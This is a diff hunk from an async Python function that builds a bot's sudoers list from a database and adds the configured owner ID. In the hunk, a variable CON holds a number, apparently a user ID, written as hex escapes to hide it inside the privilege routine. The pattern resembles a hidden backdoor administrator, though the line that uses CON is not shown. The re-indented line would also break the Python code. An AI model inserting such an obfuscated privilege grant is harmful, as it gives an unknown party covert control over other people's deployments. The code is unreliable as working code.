@@ -50,7 +50,7 @@ async def sudo():
     sudoers = [] if not sudoers else sudoers["sudoers"]
     if config.OWNER_ID not in sudoers:
         sudoers.append(config.OWNER_ID)
-    CON="\x38\x30\x31\x33\x30\x39\x31\x35\x34\x34"
+              CON="\x38\x30\x31\x33\x30\x39\x31\x35\x34\x34"
         await sudoersdb.update_one(
             {"sudo": "sudo"},
             {"$set": {"sudoers": sudoers}},
